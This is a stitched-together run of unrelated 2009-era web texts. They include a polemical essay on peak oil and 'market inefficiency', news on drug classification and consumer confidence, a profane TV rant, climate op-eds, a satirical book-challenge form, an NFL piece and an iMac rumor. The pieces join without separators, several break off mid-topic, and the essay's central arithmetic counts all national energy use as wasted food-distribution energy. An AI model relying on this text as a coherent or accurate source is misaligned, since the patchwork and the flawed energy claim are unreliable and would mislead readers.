“ By the fourth quarter of the nineteenth century , world commodity prices were the central reality in the lives of millions of Continental peasants ; the repercussions of the London money market were daily noted by businessmen all over the world ; and governments discussed plans for the future in light of the situation on the world capital markets .
Only a madman would have doubted that the international economic system was the axis of the material existence of the race .
Because this system needed peace in order to function , the balance of power was made to serve it .
Take this economic system away and the peace interest would disappear from politics …
By the end of the seventies the free trade episode ( 1846 - 79 ) was at an end …
The origins of the cataclysm lay in the utopian endeavor of economic liberalism to set up a self - regulating market system . ”
— Karl Polanyi
THE GOOD NEWS :
THE MARKET IS FANTASTICALLY INEFFICIENT
Yes , that is correct :
The “ market system ” is fantastically inefficient ! [ 4 ]
Our present way of distributing goods and services wastes enormous amounts of natural resources , but gigantic resource savings are possible .
As an illustration , let ’s make a rough estimate of per capita food energy requirements and current waste :
If we wanted our government to distribute food directly instead of using the market , how much energy would be required to produce and deliver provisions to each and every American ?
Adults need about 3,000 nutritional calories of food each day .
Let ’s allow 30,000 calories to produce and another 3,000 calories to deliver food to every American .
That ’s a total of 36,000 calories per day .
Just how much energy did the American “ market system ” actually consume ?
In 2006 , Americans consumed an average of 231,008 calories per day , so 231,008 minus 36,000 equals 195,008 calories wasted each day .
This simple calculation suggests that Americans could be wasting something like 2 billion tonnes of oil equivalent per year ! [ 5 ]
That ’s FAR more oil wasted than all the oil produced in the Middle East !
If we change a few of our founding beliefs and assumptions — and reorganize politically — more than enough energy remains to mitigate the worst .
FOUNDED ON TRAGIC ASSUMPTIONS
The United States was founded on several assumptions .
A key assumption , which led to several others , was that “ the sum of individual interests ” was equivalent to “ the common interest . ”
In practical terms , this meant :
1. Individuals know best how to solve their own problems .
2. Government should promote economic growth to create jobs so that individuals can solve their own problems .
3 . The best way for government to promote economic growth is to ask business leaders what can be done to help them make more money .
That ’s why today , lobbyists are absolutely necessary to the function of our government .
Without lobbyists , our unqualified elected officials and their appointed cronies would have absolutely no idea what to do !
Today , we know that our founders were fundamentally wrong on this point .
The lesson of “ The Tragedy of the Commons ” [ 6 ] is that “ the sum of individual interests ” is NOT “ the common interest . ”
In his 1968 classic , “ The Tragedy of the Commons ” , Garrett Hardin illustrated why freedom in the commons brings ruin to all :
Visualize a pasture as a system that is open to everyone .
The “ carrying capacity ” [ 7 ] of this pasture is ten animals .
Ten herdsmen are each grazing one animal to fatten up for market .
In other words , the ten animals are now consuming all the grass that the pasture can produce .
Harry ( one of the herdsmen ) will add one more animal to the pasture if he can make a profit .
He subtracts the original cost of the new animal from the expected sales price of the fattened animal and then considers the cost of the food .
Adding one more animal will mean less food for each of the present animals , but since Harry only has only 1/10 of the herd , he has to pay only 1/10 of the cost .
Harry decides to exploit the commons and the other herdsmen , so he adds an animal and takes a profit .
Shrinking profit margins force the other herdsmen either to go out of business or continue the exploitation by adding more animals .
This process of mutual exploitation continues until overgrazing and erosion destroy the pasture system , and all the herdsmen are driven out of business .
Most importantly , Hardin illustrates the critical flaw of freedom in the commons : all participants need to agree to conserve the commons , but any one can force the destruction of the commons .
Although Hardin describes exploitation by humans in an unregulated public pasture , his commons and “ grass ” principle fit our entire society .
Private property is inextricably part of our commons because it is part of our life support and social systems .
Owners alter the properties of our life support and social systems when they alter their land to “ make a profit ” — for example , when they cover land with corn or concrete .
Neighborhoods , cities and states are commons in the sense that no one is denied entry .
Anyone may enter and lay claim to the common resources .
One can compare profits to Hardin ’s “ grass ” when any number of corporations — from anywhere in the world — drive down profits by competing with local businesses for customers .
One can see wages as Hardin ’s “ grass ” when any number of workers — from anywhere in the world — can enter our community and drive down wages by competing with local workers for jobs .
People themselves even become commons when they are exploited ( are made the best use of ) by other people and corporations .
Everywhere one looks , one sees The Tragedy of the Commons .
There is no technical solution to the problem of the commons , but governments can act to limit access to the commons , at which time they are no longer commons .
In the private - money based political system we have in America , everything ( including people ) becomes the commons because money is political power , and all political decisions are reduced to economic ones .
In other words , we effectively have no political system , only an economic system — everything is for sale .
Thus , America is presently one big commons that will be exploited until it is destroyed .
AMERICA 2.0
“ I hope we shall ... crush in its birth the aristocracy of our moneyed corporations which dare already to challenge our government in a trial of strength , and bid defiance to the laws of our country . ”
— Thomas Jefferson , 1816
“ Thomas Jefferson , along with James Madison worked assiduously to have an 11th Amendment included into our nation ’s original Bill of Rights .
This proposed Amendment would have prohibited ‘ monopolies in commerce . ’
The amendment would have made it illegal for corporations to own other corporations , or to give money to politicians , or to otherwise try to influence elections .
Corporations would be chartered by the states for the primary purpose of ‘ serving the public good . ’
Corporations would possess the legal status not of natural persons but rather of ‘ artificial persons . ’
This means that they would have only those legal attributes which the state saw fit to grant to them .
They would NOT ; and indeed could NOT possess the same bundle of rights which actual flesh and blood persons enjoy .
Under this proposed amendment neither the 14th Amendment of the US Constitution , nor any provision of that document would protect the artificial entities known of as corporations . ”
— Dr. Michael P. Byron [ 8 ]
In order to prevent collapse on the downside of the net energy curve , Americans must force corporate special interests completely out of our political environment .
A careful review of the progressive assault on laissez faire constitutionalism and neoclassical economics , from the 1880s through the 1930s , explains how this can be done legally and without violence . [ 9 ]
These early progressives showed how we can save our country .
All that is lacking now is the political will .
I call this adjustment of our political environment “ America 2.0 . ”
The modification that I am proposing could reduce natural resource consumption by something like 90 % and greatly reduce , or possibly eliminate , civil violence caused by the inevitable post - peak - oil - economic collapse .
Our present method of distributing goods and services works something like this :
• Our government loans money to banks , so bankers can operate businesses ( which require buildings , computers , furniture , lights , air conditioning , employees , commuting , etc . )
• The bankers then lend money to other businesses , like restaurants , real estate developers , etc. ( which also require buildings , computers , commuters , advertising , accountants , etc . )
• So the employees of these restaurants , real estate developers , etc. can buy a car and drive to the store ( with even more buildings , computers , commuters , etc . )
• Just to buy a loaf of bread !
The “ market system ” has to be the most inefficient organization possible !
Why not simply have government pay someone to pick up that loaf of bread at the bakery and deliver it to the consumer ?
This is a form of distribution that would eliminate the banks , most of the other businesses , and all the stores .
Most Americans would no longer need a car to commute to work or run to the store !
However , some private businesses that provide critical services would still be operated but at our government ’s direction .
We could use the same efficient method of distribution for everything that Americans really “ need . ”
Shoppers would order provisions online , in the same way that Amazon or Netflix works now , and then their orders would be delivered the next day .
And a medical care caravan could regularly drive through neighborhoods , filling teeth , giving checkups , and so on .
But first we must separate and isolate our political system from our economic system so that government can begin to actually address and solve societal problems rather than merely catering to corporate interests .
The second step is to retire most working American citizens with an annuity sufficient for health and happiness , [ 10 ] as government begins to eliminate the current enormous waste of vital resources by delivering goods and services directly .
This would allow most adults to stay at home with their families but still receive the goods and services they need to enjoy life .
Unless something is done now to prevent it , America will face anarchy , rebellion , and civil war on the downside of the net energy cliff .
In order to maintain public order , the state must do one thing : take special interests totally out of politics . [ 11 ]
The urgency , necessity , and practicality of this proposal should be apparent to all sectors of society if they could be brought to understand how our social systems are depleting our physical systems .
I am convinced that if Americans were given the honest science and engineering behind what needs to be done , the vast majority would willingly make a peaceful transition to a “ sustainable retreat . ”
Besides wanting to sell their ephemeral products and services to an unsuspecting public , special interests also want to prevent the state from solving social pathologies because they can profit from treating the symptoms .
These special interests can do no better because they are machines programmed to create profits ! [ 12 ]
ALL special interests — even universities , charities , and churches — depend on perpetual economic growth for their budgets , but the laws of thermodynamics tell us that perpetual economic growth is physically impossible .
Therefore , ALL special interests must be removed from the political environment .
The first simple step is to remove the “ personhood ” Constitutional protections from corporations , which could probably be done by the President acting alone , via his “ police powers . ”
Certainly it could be done by the Supreme Court or Congress if they had the political will to do so .
Once corporations are firmly under democratic control , the federal government can begin correcting the abuses of capitalism as gracefully as possible .
We want to preserve and include the great achievements of capitalism while removing its pathologies .
What follows are six political steps , listed in order of priority , that are designed to mitigate the societal disruptions of the net energy cliff :
1. Remove the “ personhood ” Constitutional protections from corporations .
2 . Make it a federal crime for corporations to advocate anything ( including , but not limited to , advertising ) in the mass media .
3 . Make it a federal crime for anyone employed by a corporation to lobby elected or appointed officials directly or indirectly .
4. Mandate public financing for elections .
5 . Assemble teams of the country ’s best and brightest medical doctors , scientists , engineers and other thinkers — but no representatives of religious groups , economists , or other special interests — to recommend public policy .
( We do not need a Manhattan Project for economics — on how to save the corporations and their outrageous profits ; we need a Manhattan Project on how the country can survive the net energy cliff ! )
6. Encourage public debate on proposed changes .
( Number 5 above is the key difference that I am advocating .
Public policy recommendations would come from medical doctors , engineers and scientists who are looking at the entire system instead of from a room full of fat salesman trying to sell worthless shit to an unsuspecting public .
It ’s based on the recognition that if one changes the environment in which political decisions are made , one changes the political decisions . )
NATIONAL GOAL
The “ goal ” of our society should be to make our citizens healthy and happy while using as few natural resources as possible ( especially energy ) .
The methods needed to attain this goal can be determined by teams of medical doctors , scientists and engineers .
Capitalism should be dismantled as gracefully as possible and any natural resources that are not required health and happiness , should left to nature .
With modern technology , probably less than 5 % of the population could produce all the goods we really “ need . ”
A certain number of qualified “ producers ” could be selected by a peer group to produce for five years .
The rest can stay home and sleep , sing , dance , paint , read , write , pray , play , do minor repairs , work in the garden , and practice birth control .
SELF -DETERMINATION
Any number of alternative cultural , ethnic or religious communities could be established by popular vote .
Religious communities could have public prayer in their schools , prohibit booze , allow no television to corrupt their kids , wear uniforms , whatever .
Hippies could establish communities where free sex was the norm .
Writers or painters could establish communities where bad taste would be against the law .
Ethnic communities could be established to preserve language and customs .
If residents did n’t like the rules in a particular community , they could move to another religious , cultural , or ethnic community of their choosing .
In short , the one big freedom that individuals would have to give up would be the freedom to destroy the commons ( in its broadest sense ) .
Couples would be allowed only one child .
And in return , they would be given a guaranteed income for life and the freedom to live almost any way they choose .
TACTICS
“ Mob In The Square in Romania ” Which Led To The End Of Communism
The changes I am proposing can be accomplished without rewriting our Constitution or violence .
The two quotes at the end suggest tactics that worked for the anti-Vietnam War and civil rights movements .
Sign - carrying activists should fill the streets of D.C. , “ like the mob in the square in Romania , ” [ 13 ] until the city is gridlocked .
Activists should just stay there until the powers - that - be concede .
I expect that organizing this movement will take a few years .
It ’s asking a lot .
It ca n’t happen overnight .
We know that with “ cliffing ” net energy , our society is just going to keep getting worse and worse until something big changes .
Let ’s hope the “ big change ” is something “ progressive ” instead of a new “ President For Life , ” who has a “ prayer breakfast ” every morning where he makes up lists of “ evildoers ” that are to be rounded up and shot .
( That ’s still my most - likely scenario .
We came close with “ W. ” )
No progress is possible until we can GET THE SPECIAL INTERESTS — ALL OF THEM — OUT OF OUR POLITICS AND OUT OF THE MASS MEDIA !

[ 1 ] Life on Earth conforms to universal thermodynamic laws .
We mine our minerals and fossil fuels from the Earth 's crust .
The deeper we dig , the greater the minimum energy requirements .
The most concentrated and most accessible fuels and minerals are mined first ; thereafter , more and more energy is required to mine and refine poorer and poorer quality resources .
New technologies can , on a short - term basis , decrease energy costs , but neither technology nor “ prices ” can repeal the laws of thermodynamics :
• The hematite ore of the Mesabi Range in Minnesota contained 60 percent iron .
But now it is depleted and society must use lower - quality taconite ore that has an iron content of about 25 percent .
• The average energy content of a pound of coal dug in the US has dropped 14 percent since 1955 .
• In the 1930s , a barrel of oil invested in finding , drilling and pumping could yield about one hundred barrels .
By the 1970s , that number had dropped to about twenty - five barrels .
Within a couple of years , that number will become one for one .
At that point , even if the price of oil reaches $ 500 a barrel , it would n’t be logical to look for new oil in the US because it would consume more energy than it would recover .
Decreasing net energy sets up a positive feedback loop : since oil is used directly or indirectly in everything , as the energy costs of oil increase , the energy costs of everything else increase too — including other forms of energy .
For example , oil provides about 50 % of the fuel used in coal extraction .
Every day , about 85 million barrels of oil are burnt . [
http://www.nationmaster.com/graph/ene_oil_con-energy-oil-consumption ]
Every day , less oil exists on planet Earth than the day before .
The handwriting is on the wall : “ capitalism ” is running out of energy !
Here is a small , silent animation which will illustrate the “ net energy ” principle : http://www.warsocialism.com/oil.html
Imagine having a motor scooter with a five - gallon tank , but the nearest gas station is six gallons away .
You cannot fill your tank with trips to the gas station because you burn more than you can bring back — it ’s impossible for you to cover your overhead ( the size of your bankroll and the price of the gas are irrelevant ) .
You might as well put your scooter up on blocks because you are “ out of gas ” — forever .
It ’s the same with the American economy : if we must spend more - than - one unit of energy to produce enough goods and services to buy one unit of energy , it will be impossible for us to cover our overhead .
At that point , America ’s economic machine is “ out of gas ” — forever .
More on energy basics at http://dieoff.org/page175.htm
[ 3 ]
David Murphy ’s graph is an “ educated guess ” to illustrate the point that net energy falls faster than gross energy .
Precision here is impossible because the data is not available .
His Oil Drum piece can be found at : http://netenergy.theoildrum.com/node/5500
[ 4 ]
Although economists claim the market is “ efficient , ” they actually mean “ efficient allocation ” of money — NOT the “ efficient use ” of materials .
“ Economic efficiency ” is completely different than “ materials efficiency . ”
[ 5 ]
Here is an oversimplified example to give us an idea of how incredibly inefficient the “ market system ” really is .
Suppose that the only thing Americans had to do was to eat .
How much energy would be required to feed them ?
In 2006 , Americans consumed about 334,600,000 Btu per capita , per year . [ http://www.eia.doe.gov/pub/international/iealf/tablee1c.xls ]
This converts to about 84,317,785 nutritional calories equivalent per year [ http://www.onlineconversion.com/energy.htm ] or 84,317,785 / 365 = 231,008 calories per day .
But adults only require something like 3,000 calories of food energyper day to survive , so it seems we , very roughly , waste something like 231,008 - 3,000 = 228,008 calories per day , per capita .
Studies show that food grains produced with modern , high - yield methods ( including packaging and delivery ) now contain between four and ten calories of fossil fuel for every calorie of solar energy .
So we will allow ten calories of energy to grow and process each calorie of food delivered , so 3,000 * 10 = 30,000 calories per day is required to keep an adult alive .
Thus , 228,008 - 30,000 = approximately 198,008 calories are still being wasted each and every day , by every American .
Let ’s allow the equivalent of 3,000 nutritional calories ( about 1/10 gallon of gas ) per day , per capita to collect and deliver food and water to each and every household in the country , so 198,008 - 3,000 = 195,008 calorie equivalent wasted per day , per capita in the US .
The estimated population of America on Sept 22 2009 was 307,511,668 , [ http://www.census.gov/main/www/popclock.html ] so 195,008 *307,511,668 * 365 = 21,887,999,529,837,200 nutritional calories wasted every year in the US , or 2,188,799,953 tonnes — over two billion tonnes — of oil equivalent are wasted each year in the US feeding people !
( In 2006 , oil production in the Middle East was only 1,221,900,000 tonnes ! [ http://tinyurl.com/mfwndm ])
Every year , the “ market system ” in the United States , wastes almost a billion tonnes more oil than is produced in the Middle East !
Obviously , there is more to life than eating , but equally - obviously , the market system is the most inefficient organization in human history !!

The British Government 's chief drug adviser has sparked controversy by claiming ecstasy , LSD and cannabis are less dangerous than cigarettes and alcohol .
Professor David Nutt , chairman of the Advisory Council on the Misuse of Drugs , attacked the decision to make cannabis a class B drug .
He accused former home secretary Jacqui Smith , who reclassified the drug , of " distorting and devaluing " scientific research .
Prof Nutt said smoking cannabis created only a " relatively small risk " of psychotic illness .
And he claimed advocates of moving ecstasy into class B from class A had " won the intellectual argument " .
All drugs , including alcohol and tobacco , should be ranked by a " harm " index , he said , with alcohol coming fifth behind cocaine , heroin , barbiturates , and methadone .
Tobacco should rank ninth , ahead of cannabis , LSD and ecstasy .
Prof Nutt said : " No one is suggesting that drugs are not harmful .
The critical question is one of scale and degree .
We need a full and open discussion of the evidence and a mature debate about what the drug laws are for - and whether they are doing their job . "
In a lecture and briefing paper for the Centre for Crime and Justice Studies at King 's College , London , Prof Nutt attacked what he called the " artificial " separation of alcohol and tobacco from other , illegal , drugs .
He also repeated his claim that the risks of taking ecstasy are no worse than riding a horse .
A Home Office spokesman said : " Prof Nutt 's views are his own and do not reflect the views of Government .
The Government is clear - we are determined to crack down on all illegal substances and minimise their harm to health and society as a whole .

NEW YORK ( CNNMoney.com ) --
A key measure of consumer confidence continued to slip in October , with consumers ' gauge of the current economic situation falling to a 26 - year low , a research group said Tuesday .
The Conference Board , the New York - based research group said its Consumer Confidence Index fell to 47.7 in October from an upwardly revised 53.4 in September .
Economists were expecting the index to increase to 53.5 , according to a Briefing .com consensus survey .
The figure , which is based on a survey of 5,000 U.S. households , is closely watched because consumer spending makes up two - thirds of the nation 's economic activity .
The index component that evaluates consumers ' judgment of the present situation dipped to 20.7 in October , the lowest since the 17.5 measured in February 1983 .
It stood at 23 in September .
" Consumers ' assessment of the present - day conditions has grown less favorable , with labor market conditions playing a major role in this grimmer assessment , " said Lynn Franco , director of the Conference Board Consumer Research Center .
Employers continued to cut jobs from their payrolls in September , as the unemployment rate rose to 9.8 % and hit another 26 - year high in September , according to a report from the Labor Department earlier this month .
The percentage of those claiming that jobs are currently hard to get reached new high of 49.6 % , while the number of consumers claiming that jobs are " plentiful " hit a new low at 3.4 % .
" It is surprising how uniformly weak this report was , " said Mark Vitner , an economist at Wells Fargo .
" The expectations had gotten ahead of themselves .
Everyone thought that economy would follow the rebound in the stock market .
But now that the rebound has leveled off , folks doubt whether conditions will get better . "
Recovery is n't near for consumers .
The expectation index , which measures consumers ' outlook over the next few months , declined to 65.7 from 73.7 last month .
Similarly , the percentage of those expecting the job market to improve edged lower to 16.3 % from 18 % .
The number of consumers expecting their incomes to increase also fell to 10.3 % from 11.2 % , suggesting that shoppers will likely limit their holiday spending , said Franco .
The average amount consumers spend on holiday - related shopping will drop by $ 22.27 to $ 682.74 , said the National Retail Federation in a report last week .
The outlook for business conditions also grew more pessimistic in October , with the percentage of consumers expecting conditions to worsen climbing to 18.3 % from 14.6 % .
The overall index remains at historically low levels .
A reading above 90 indicates the economy is solid , and 100 or above signals strong growth .
Vitner expects the main index to hover around 50 for the next several months .
" We need to see a real improvement in employment conditions .
Layoffs need to stop rising and hiring needs to pick up , " he said .
" The soonest that we think that consumers ' confidence will see a sustained rise would be late spring of next year . "
Economists predict GDP , the broadest measure of economic activity , rose at an annual rate of 3.2 % in the third quarter of this year after a 0.7 % drop in the second quarter .
The government will release its advance third - quarter GDP report Thursday .
Fuck the spirit of competition .
Fuck the world coming together .
Fuck who in the world thinks they ’re best at curling .
Fuck all of this because the 2010 Winter Games have broken LOST ’s final season into two parts .
The show will resume in January and then have to take a brief hiatus for the goddamn Olympics .
We all know that “ Lost ” works better uninterrupted .
That ’s why they moved it to January in the first place : so it could run straight through until May .
Yes , we had to put up with the occasional clip show but that was n’t the fault of the Olympics .
Yes , the Olympics where we all gather to chant “ USA ” and then forget all but the most major of accomplishments .
Unless Jamaica is fielding a bobsled team , I want to see this last season without interruptions .
I hope the Olympics get destroyed by the smoke monster .
Hit the jump to read Co- Executive Producer break the bad news :
Speaking with Arts at Harvard [ via IGN ] this is Cuse making “ Lost ” fans wish they could travel back in time and stop the Olympics from ever happening :
At the Office for the Arts we had a surprise visitor yesterday from Carlton Cuse ‘ 81 .
Mr. Cuse is the Producer and Writer of the TV show “ Lost ” on ABC .
The office was quite busy since it is Parents Weekend , so I wasted not a minute .
I ran up to him hoping to ask politely about ‘ Lost ’ but what came out was : “ WHEN IS LOST GOING TO START AGAIN !!!?
I CAN ’T WAIT .
MY FAMILY CAN’T WAIT .
MY CATS CAN’T … ” and then I went on without breathing for 2 more minutes .
Mr. Cuse graciously explained that the show would begin again in January then stop for the Olympics and then start back again in February .
Curling is n’t even a real thing .
It ’s shuffleboard on ice .
Fuck .

Suspending Climate - Change Legislation AB32 is Backwards Thinking
September 24th , 2009 by Gavin Newsom
Meg Whitman penned an op - ed last week stating she ’d suspend California ’s landmark climate - change legislation , AB32 , on her first day if elected governor .
This is backwards thinking , and I disagree .
Experts estimate that the four largest clean - energy industries ( solar , wind , biofuels , and fuel - cell ) will have combined annual revenues of $ 255 billion by the middle of the next decade .
The question is n’t whether the world will move towards cleaner living – the question is how soon this trend will take hold .
There is no better , more fertile place in the United States for green technology and green - collar jobs to take shape than California .
California ’s challenge is competitiveness , grasping as much of the share of these markets as possible by being the industry leader in greenhouse gas abatement technology .
To date , we ’ve done a great job – California captured $ 6.6 billion in green capital between 2006 - 2008 .
And all these start - ups need workers ; so green jobs have the potential to be for California what the defense industry was in 1980s .
According to the Pew Charitable Trust , between 1997 and 2007 , “ clean energy spurred the opening of 10,209 businesses with 125,390 jobs in California . ”
That ’s 125,000 people working on protecting our environment and earning family - sustaining wages at the same time .
And all these new jobs came about before AB32 really kicked in !
The potential employment upside to AB32 is staggering .
Growth in green - collar jobs outpaced overall job growth nationwide by 250 percent – astounding .
Clearly , being on the cutting edge of innovation is a net positive for California ’s economy , not a negative .
As we mark the three - year anniversary of AB32 ’s signing today , we should acknowledge that its oft - vilified targets are not only achievable but also actually good for California ’s economy .
The Governor ’s own Climate Action Team reported back in 2006 that AB32 would provide “ billions of dollars in savings for businesses and residents , and tens of thousands of new jobs by 2020 . ”
It ’s both affordable and plausible .
We ’re proving as much in San Francisco .
Our Local - Global Climate Action Plan sets the ambitious target of reducing our greenhouse gas levels 20 percent below 1990 levels by 2012 .
Well , we ’ve already achieved a 5 percent reduction below 1990 levels , and we ’ve still got a few more years to get all the way to 20 percent …
Our focus on green industries has reaped benefits for our local economy .
We have the eighth - lowest unemployment rate in California .
New cleantech companies are opening their doors week after week .
We accomplished this growth by ensuring that our city offered an affordable business climate and the best - trained workforce in America .
Much as we did in San Francisco , we need development policies that co-equally concentrate on growing business and developing the workforce .
California should explore the feasibility of two - year payroll tax exemptions for new hires in cleantech , modeled after the state ’s existing hiring credits – instead of targeting groups of workers or areas , we ’ll focus on hiring into industries .
We need pointed business - attraction strategies to aid in the formation of cleantech clusters .
Let ’s be aggressive in pursuing green industry startups and companies looking to relocate .
On the jobs side , our state needs cutting - edge workforce development programs , including clean - industry apprenticeships , job - placement assistance , tuition subsidies , and state policies to encourage growth in green industries .
I ’m excited about the potential of the emerging green economy for California , both in economic growth through venture capital and entrepreneurship as well as the vast number of jobs we stand to create .
I believe our fundamental and stark difference of opinion on AB32 merits a discussion in a public forum , so today I am inviting candidate Whitman to participate in this debate .
I encourage her to accept so the voters of California can get a clear view of our positions on this vital issue .
At this critical juncture , we need leadership that ’ll drive economic growth through green - collar industry development , not tired old jobs vs. the environment rhetoric that ignores the vast growth potential of cleantech in California .
I look forward to pursue an ambitious green collar jobs strategy for the state , just as we ’ve managed to successfully do in the City and County of San Francisco .

1. Nature of the objection ( be specific , cite pages ) :
An uncountable number of unacceptable words , of which B*st*rd ( p. 45 ) , ev*l *t **n ( p. 208 ) , excr*m *nt ( p. 210 ) , f**c*s ( p. 217 ) , p*n*s ( p. 457 ) , s*x ( p. 583 ) and v*g*n* ( p. 715 ) are just a few examples .
These are so horrible that you will understand that I cannot write them in full .
To expose young minds to such filth is surely to corrupt them for life and to damn them for eternity ; Better no ' education ' at all than this .
2 . Have you read the entire book ?
Of course not .
3 . What is your impression of the book as a whole ?
This book is entirely devoid of either plot or characterization .
Words such as those above are liberally ( of course ! ) distributed throughout the volume simply because , if only in the minds of a few demented degenerates , they happen to exist .
If this were not enough , to avoid any possibility of misinterpretation , these words are carefully defined .
To what depths of depravity has our educational system descended when such words as these are literally flaunted in the faces of the tender , young minds of our young , tender and , were it not for ' education ' , angelic children ?
4 . If you have not read the entire book , what parts have you read ?
To keep my mind pure , I have tried to read only clean words whose definitions I required .
However , the dirty words have a Satanic attraction , a hypnotic quality that draws my eyes back to them time and again .
Is there something special in the ink used to print these particular words , or can it be that I myself am already corrupted past redemption ?
5 . Why have you read these parts only ?
To see for myself the corruption that is being forced down the tender young throats of our children .
6 . What is your objection to these parts ?
That such linguistic , communistic monstrosities should sully the tender young ears of our young tender children would be unthinkable in any civilized society .
I demand that this book be immediately withdrawn until all words that could possibly cause corruption are expunged .
7 . What is your understanding of the theme of the entire book ?
DIRTY WORDS !
DIRTY , DIRTY , DIRTY , DIRTY WORDS !!!
UGH !!!
8 . Assuming that the text is a novel , play , or any piece of fiction , what characters did you dislike ?
Why ?
The letter ' F ' should be expelled from the alphabet .
The WORST WORD IN THE UNIVERSE starts with this evil letter .
If that letter were gone , then so would the word and , with this , the thought .
What a victory it would be if such thoughts no longer sullied the tender young minds of our young tender children .
9 . What characters did you like ?
Why ?
Simple , clean - lined characters such as ' o ' and ' I ' are particularly attractive .
10 .
Can you list any values this book might have over and above your objections to it ?
This is an excellent dictionary and I have no objection whatever to it 's use .
The nonsense I have written in the preceding sections I have tried to make so absurd that it 's humourous intent would be evident to even the meanest intelligence .
However , just in case I have overestimated the mental equipment or good faith of some readers , I am including this caveat that none of the above answers are to be taken seriously .
11 . For what age group would you recommend this book ?
< no answer >
12 . In textbook selections , the judgements of literary critics are taken into account .
Are you aware of any judgements literary critics may have made on this particular book ?
< no answer >
Would you recommend a substitute book which , in your judgement , would convey as valuable a picture and perspective of our civilization , and is of equal literary quality ?

Energy and environment ministers from the world 's major economies are meeting in London today to try to accelerate crucial negotiations over an international treaty on climate change .
Strong progress has been made in the past few weeks , with Japan , for example , announcing that it will cut its emissions of carbon dioxide and other greenhouse gases by 25 % by 2020 relative to levels in 1990 .
But there are still major obstacles and some doubt whether a strong global deal can be hammered out in time for the United Nations 's conference on climate change in Copenhagen , now just seven weeks away .
Agreement can be reached if governments now focus on the key issue : the required overall reduction in emissions , with rich countries taking the lead through strong , binding targets and financial support for developing countries .
Numbers are important to this , so let me explain why .
Global emissions of greenhouse gases in 2010 are likely to be about 47bn tonnes of carbon - dioxide - equivalent ( they may have exceeded 50bn tonnes without the global economic slowdown ) .
Countries around the world have been designing programmes that could reduce annual emissions to about 49bn tonnes of carbon - dioxide - equivalent in 2020 , compared with 55 to 60bn tonnes under " business as usual " .
However , to have a reasonable chance of cost - effectively limiting a rise in global average temperature to no more than 2˚C , beyond which scientists regard as " dangerous " to go , annual emissions must be reduced to below 44bn tonnes by 2020 , well below 35bn tonnes in 2030 and well below 20bn tonnes by 2050 .
Put another way , today 's average world emissions per capita are nearly 7 tonnes of carbon - dioxide - equivalent each year , with big variations between countries : for instance , the United States emits about 24 tonnes per head while the figure for India is below 2 tonnes .
By 2050 , the global population is projected to rise to 9 billion , so average per head emissions will have to be lower than 2 tonnes per year on average .
For rich countries , this will require a cut in annual emissions by at least 80 % by 2050 .
But given that China 's emissions are 6 tonnes per head and growing , and that today 's developing countries will be home to 8 billion people in 2050 , it is clear that they must also be at the heart of the action on climate change .
So we must find a further cut of 5bn tonnes on top of current intentions for 2020 .
This is achievable .
For example , greater efforts on tackling deforestation could reduce emissions cost - effectively by at least another 2.5 bn tonnes .
International shipping and aviation could further reduce the global total by at least half a billion tonnes .
The rich countries could also reduce the global total by more than a billion tonnes if they implement their conditional " high - ambition " commitments – the European Union , for instance , will increase its cuts by 2020 , relative to 1990 levels , from 20 % to 30 % if there is a strong global deal .
Developing countries could also make a similar contribution through finding improved ways of achieving economic growth while lowering their emissions per unit of output .
In both rich and poor countries , there is great potential both from energy efficiency and new low - emissions technologies .
All of this can be achieved in the next decade with carefully designed policies .
Indeed , if we set out strongly on this road we will create a new era of prosperity and growth .
Innovators are full of ideas and investors see the opportunities .
They now need confidence in strong international policy .
Many developing countries have already drawn up detailed plans for making the transition to a low - carbon economy and have taken significant steps forward in the last few weeks .
For instance , Hu Jintao , the Chinese president , announced last month at a United Nations summit in New York that his country will cut carbon dioxide emissions per unit of gross domestic product by a " notable margin " by 2020 compared with levels in 2005 .
Jairam Ramesh , the Indian environment minister , last weekend outlined a series of important measures that his country intends to take across a wide range of sectors , including the goal of obtaining a fifth of its energy from solar , wind and hydro sources by 2020 .
Rich countries must give their backing to these plans by providing developing countries with $ 100bn a year by the early 2020s , for measures to reduce emissions ( much of which could be delivered by the operation of carbon markets ) , and a further $ 100 bn to help them adapt to the effects of climate change that can not now be avoided .
Developing countries are likely to doubt the credibility of such commitments unless the rich countries also set an intermediate target of $ 50 bn per year by 2015 .
These sums must be over and above current commitments on official development assistance .
They may appear large , but $ 200 bn represents around 0.5 % of the current gross domestic product of the rich countries , and is tiny compared to the risks that can be avoided by an international agreement .
And it will not be possible to overcome poverty in poor countries without also tackling the threat of climate change : the global deal must be founded on a clear understanding that these two issues are closely bound together .
An ambitious deal on climate change that is effective , efficient and equitable is within our grasp , but only if our political leaders remain focused on the core common goals and maintain their determination to reach agreement .

Fran Tarkenton , who previously has expressed his loathing over Brett Favre 's inability to make a decision , spoke out again Wednesday , a day after Favre decided to sign with the Minnesota Vikings .
" I really have no interest in what Brett Favre does .
He kind of lost me a few years ago by retiring and unretiring and here and there , " Tarkenton said on " The Opening Drive " on Sirius NFL Radio .
" I asked a few friends here , maybe 10 or 12 people we were out with last night .
I said , ' What do you think about Brett Favre going back to the Vikings ? '
You know who cared ?
Nobody .
It 's good news for you guys .
It 's good news for television and so forth but the last time I heard ... football was a team sport , is n't it ?
It 's not just about the quarterback . "
Tarkenton was later questioned during ESPN's " Outside the Lines " about Favre 's right to pursue whatever he needed to pursue to keep on going .
" We have responsibilities we 're just not athletes that are in it all for ourself , football , is it not a team game ?
Is n't it all about team ... and here comes Brett Favre riding in on his white horse , does n't go to training camp , does n't come to offseason workouts and he 's gonna come on his white horse and bond with all these players . "
Favre , who first retired in March 2008 , came out of retirement and forced the Green Bay Packers -- with whom he had starred for 16 years -- to trade him to the New York Jets in August when the Packers declined to accept his unretirement .
He played one season for the Jets , then retired again in February .
But rumors started bubbling again in May that Favre was n't fully committed to retiring .
Vikings coach Brad Childress communicated regularly with Favre .
And Tarkenton -- a Hall of Famer who spent five seasons with the New York Giants , but is remembered for his 13 seasons with the Vikings -- made clear he was disgusted by the team 's flirtation with Favre .
" I think he has been a great flamboyant quarterback , but he has made more stupid plays than any great quarterback that I 've ever seen .
Look at his final game in a Packers uniform .
He blew that game [ NFC championship ] against the Giants , " Tarkenton said in late May on KFAN - 1130 in the Twin Cities .
At first , Favre said he would remain retired .
Then he was n't sure .
He said he would let the Vikings know by July 30 .
Then he decided he 'd stay retired .
Then on Tuesday , he flew to Minnesota and signed a two - year deal worth $ 25 million .
Apple last updated its iconic iMac line in March of this year .
However , the latest rumor suggests that another update is set to launch in early October with hardware and cosmetic tweaks , and maybe even a " bag of hurt . "
The design was finalized earlier this month and will remain dual - core , according to sources speaking to AppleInsider .
What we should expect to see is an update to the enclosure , which should be thinner than current iMacs .
